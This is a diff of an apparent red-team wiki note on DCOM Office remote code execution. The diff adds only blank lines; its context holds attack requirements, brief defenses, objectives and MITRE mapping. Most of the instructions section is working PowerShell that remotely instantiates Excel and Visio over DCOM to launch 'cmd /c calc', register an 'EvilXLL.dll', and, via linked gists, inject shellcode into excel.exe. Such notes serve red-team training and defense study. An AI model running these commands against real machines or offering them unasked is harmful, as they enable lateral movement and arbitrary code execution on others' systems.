@@ -38,6 +38,8 @@ DCOM Office Remote Code Execution is an attack that leverages DCOM to execute ar
 
 DCOM Office Remote Code Execution is an attack that leverages DCOM to execute arbitrary code on a remote system via Office applications. The attacker first establishes a foothold on the network and then exploits the DCOM vulnerability to remotely execute code on a target system. This attack can be used to move laterally across the network and gain access to sensitive information. Technical details of this attack include exploiting a vulnerability in DCOM to execute arbitrary code on a remote system via Office applications. The business value of this attack is that it allows an attacker to gain access to sensitive data and move laterally across the network.
 
+ 
+
 ## Requirements
 
 1. Access to the network
@@ -45,6 +47,8 @@ DCOM Office Remote Code Execution is an attack that leverages DCOM to execute ar
 1. Exploitable DCOM vulnerability
 
 1. Office applications installed on target system
+
+ 
 
 ## Defense
 
@@ -54,6 +58,8 @@ DCOM Office Remote Code Execution is an attack that leverages DCOM to execute ar
 
 1. Monitor network for unusual DCOM activity
 
+ 
+
 ## Objectives
 
 1. Execute arbitrary code on a remote system
@@ -62,13 +68,23 @@ DCOM Office Remote Code Execution is an attack that leverages DCOM to execute ar
 
 1. Gain access to sensitive information
 
+ 
+
 # Instructions
 
 1. The provided PowerShell script can be used to execute arbitrary code on a remote machine via Office applications. It uses various techniques such as DCOM, Excel DDE, Excel RegisterXLL, and Visio to execute the code.
 
+ 
+
+
+
 **Code**: [[# Powershell script that injects shellcode into ex]]
 
+
+
 > The script can be used to inject shellcode into excel.exe via ExecuteExcel4Macro through DCOM. It can also be used to execute commands via Excel DDE and Visio. Additionally, it can register an XLL file with Excel and execute code via it. However, this technique cannot be used reliably with a remote target. The PowerShell script also requires the Trusted Locations registry key to be added for Excel RegisterXLL technique to work.
+
+
 
 **Command** ([[Inject shellcode into excel.exe via ExecuteExcel4Macro through DCOM]]):
 
@@ -76,11 +92,19 @@ DCOM Office Remote Code Execution is an attack that leverages DCOM to execute ar
 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9
 ```
 
+
+
+
+
 **Command** ([[Invoke ExShellcode]]):
 
 ```bash
 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a
 ```
+
+
+
+
 
 **Command** ([[Using Excel DDE]]):
 
@@ -90,6 +114,10 @@ $excel.DisplayAlerts = $false
 $excel.DDEInitiate(\"cmd\", \"/c calc.exe\")
 ```
 
+
+
+
+
 **Command** ([[Using Excel RegisterXLL]]):
 
 ```bash
@@ -97,12 +125,18 @@ $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Applicati
 $excel.RegisterXLL(\"EvilXLL.dll\")
 ```
 
+
+
+
+
 **Command** ([[Using Visio]]):
 
 ```bash
 $visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Visio.InvisibleApp\", \"$ComputerName\"))
 $visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -133,3 +167,5 @@ $visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")
 - [[Active Directory Attacks]]
 - [[DCOM Exploitation]]
 - [[DCOM via Office]]
+
+
